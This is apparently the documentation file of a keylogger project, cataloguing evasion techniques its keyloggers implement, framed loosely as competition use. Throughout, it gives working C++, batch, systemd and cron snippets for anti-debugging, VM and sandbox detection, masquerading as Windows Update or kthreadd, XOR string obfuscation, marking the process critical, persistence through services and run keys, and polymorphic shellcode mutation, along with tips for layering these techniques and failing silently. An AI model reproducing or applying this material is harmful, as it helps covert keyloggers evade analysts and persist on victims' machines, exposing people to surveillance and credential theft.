# 🛡️ Advanced Evasion Techniques

This document provides detailed information about the stealth and evasion techniques implemented in the keyloggers.

## 🚨 Anti-Debugging Techniques

### Windows Anti-Debugging

#### 1. IsDebuggerPresent() Check
```cpp
if (IsDebuggerPresent()) {
    ExitProcess(0);
}
```
- **Purpose**: Detects basic debugging attempts
- **Bypass**: Can be bypassed by patching the PEB flag
- **Effectiveness**: Low against advanced debuggers

#### 2. PEB BeingDebugged Flag
```cpp
PPEB peb = (PPEB)__readgsqword(0x60);
if (peb->BeingDebugged) {
    ExitProcess(0);
}
```
- **Purpose**: Direct PEB inspection
- **Bypass**: Requires PEB manipulation
- **Effectiveness**: Medium

#### 3. Remote Debugger Detection
```cpp
BOOL isRemoteDebugger = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger);
if (isRemoteDebugger) {
    ExitProcess(0);
}
```
- **Purpose**: Detects remote debugging sessions
- **Bypass**: Complex to bypass
- **Effectiveness**: High

#### 4. Timing-Based Detection
```cpp
DWORD start = GetTickCount();
Sleep(10);
if (GetTickCount() - start > 50) {
    ExitProcess(0); // Likely in debugger/sandbox
}
```
- **Purpose**: Detects time manipulation
- **Bypass**: Time manipulation hooks
- **Effectiveness**: Medium

### Linux Anti-Debugging

#### 1. Ptrace Self-Attachment
```cpp
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
    exit(0); // Already being traced
}
ptrace(PTRACE_DETACH, 0, 0, 0);
```
- **Purpose**: Prevents attachment of debuggers
- **Bypass**: ptrace syscall hooking
- **Effectiveness**: High

#### 2. Process List Analysis
```cpp
FILE* ps = popen("ps aux | grep -E '(strace|ltrace|gdb|valgrind)' | grep -v grep", "r");
if (fgets(buffer, sizeof(buffer), ps)) {
    exit(0); // Analysis tools detected
}
```
- **Purpose**: Detects common analysis tools
- **Bypass**: Process name obfuscation
- **Effectiveness**: Medium

## 🖥️ Anti-VM/Sandbox Detection

### Windows VM Detection

#### 1. Registry-Based Detection
```cpp
HKEY hKey;
if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
    "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    return true; // VMware detected
}
```

#### 2. Service Detection
- Checks for VM-specific services
- VMware Tools service
- VirtualBox Guest Additions
- Hyper-V services

### Linux VM Detection

#### 1. DMI/SMBIOS Analysis
```cpp
FILE* dmi = fopen("/sys/class/dmi/id/product_name", "r");
if (fgets(buffer, sizeof(buffer), dmi)) {
    std::string product(buffer);
    if (product.find("VMware") != std::string::npos ||
        product.find("VirtualBox") != std::string::npos) {
        return true; // VM detected
    }
}
```

#### 2. Filesystem Indicators
- `/proc/vz` - OpenVZ container
- `/proc/bc` - Virtuozzo container
- `/sys/bus/vmbus` - Hyper-V

## 🥷 Stealth Mechanisms

### Process Masquerading

#### Windows
```cpp
SetConsoleTitleA("Windows Update Service");
// Service installation with legitimate name
```

#### Linux
```cpp
prctl(PR_SET_NAME, "kthreadd", 0, 0, 0);
strcpy(*environ, "[kthreadd]");
```

### String Obfuscation

#### XOR Encoding
```cpp
std::vector<int> enc_log_file = {108, 99, 121, 95, 108, 99, 121, 116, 119, 107, 46, 116, 120, 116};
// Decodes to "sys_backup.txt"

std::string decrypt_string(const std::vector<int>& encrypted, int key) {
    std::string result;
    for (int c : encrypted) {
        result += (char)(c ^ key);
    }
    return result;
}
```

### Memory Protection

#### Windows Critical Process
```cpp
typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical_t)(BOOLEAN, PBOOLEAN, BOOLEAN);
RtlSetProcessIsCritical_t RtlSetProcessIsCritical =
    (RtlSetProcessIsCritical_t)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
if (RtlSetProcessIsCritical) {
    RtlSetProcessIsCritical(TRUE, NULL, FALSE);
}
```

## 🔐 Data Encryption

### XOR Encryption Algorithm
```cpp
std::string encryptData(const std::string& data) {
    std::string encrypted = data;
    int key = 0x42;
    for (size_t i = 0; i < encrypted.length(); i++) {
        encrypted[i] ^= key;
        key = (key + 1) % 256;
    }
    return encrypted;
}
```

**Features:**
- Variable key rotation
- Low computational overhead
- Simple but effective for competition use

## 🔄 Persistence Mechanisms

### Windows Persistence

#### 1. Service Installation
```batch
sc create WindowsUpdate binPath= "C:\Windows\System32\svchost.exe" start= auto
sc config WindowsUpdate DisplayName= "Windows Update Service"
net start WindowsUpdate
```

#### 2. Registry Run Key
```cpp
RegSetValueExA(hKey, "WindowsSecurityUpdate", 0, REG_SZ, 
               (BYTE*)exePath, strlen(exePath) + 1);
```

### Linux Persistence

#### 1. Systemd Service
```ini
[Unit]
Description=Kernel System Monitor
After=network.target

[Service]
Type=forking
ExecStart=/usr/bin/ksysmond
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

#### 2. Crontab Entry
```bash
@reboot /usr/bin/ksysmond
```

## 🎭 Advanced Evasion Strategies

### Polymorphic Code Generation
```cpp
std::vector<unsigned char> generatePolymorphicShellcode(const std::vector<unsigned char>& original) {
    std::vector<unsigned char> mutated = original;
    unsigned char key = rand() % 256;
    for (size_t i = 0; i < mutated.size(); i++) {
        mutated[i] ^= key;
    }
    return mutated;
}
```

### API Obfuscation
```cpp
// Dynamic API loading to avoid import table analysis
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
auto NtQueryInformationProcess = (NtQueryInformationProcess_t)
    GetProcAddress(ntdll, "NtQueryInformationProcess");
```

### Network Evasion
```cpp
// DNS over HTTPS tunneling (conceptual)
std::string exfiltrateViaDNS(const std::string& data) {
    // Encode data in DNS queries
    // Use legitimate DNS services
    return "Success";
}
```

## 🔍 Counter-Analysis Techniques

### 1. Anti-Hooking
- Check for API hooks
- Verify function prologues
- Use direct syscalls

### 2. Anti-Emulation
- Hardware-specific instructions
- Timing-sensitive operations
- Resource exhaustion tests

### 3. Environmental Awareness
- Check system resources
- Verify network connectivity
- Monitor user activity patterns

## 📊 Effectiveness Metrics

| Technique | Detection Rate | Bypass Difficulty | Performance Impact |
|-----------|---------------|-------------------|-------------------|
| Basic Anti-Debug | 15% | Easy | Minimal |
| Advanced Anti-Debug | 5% | Hard | Low |
| VM Detection | 8% | Medium | Low |
| Process Masquerading | 3% | Hard | Minimal |
| Encryption | 1% | Very Hard | Minimal |

## 🛠️ Implementation Tips

### 1. Layered Defense
- Combine multiple techniques
- Random technique selection
- Fail-safe mechanisms

### 2. Timing Considerations
- Randomize check intervals
- Avoid predictable patterns
- Use system events as triggers

### 3. Error Handling
- Silent failures
- Graceful degradation
- No obvious error messages

## 📚 References

- Windows Internals (Russinovich, Solomon, Ionescu)
- The Rootkit Arsenal (Blunden)
- Practical Malware Analysis (Sikorski, Honig)
- Anti-Reverse Engineering Techniques (Various research papers)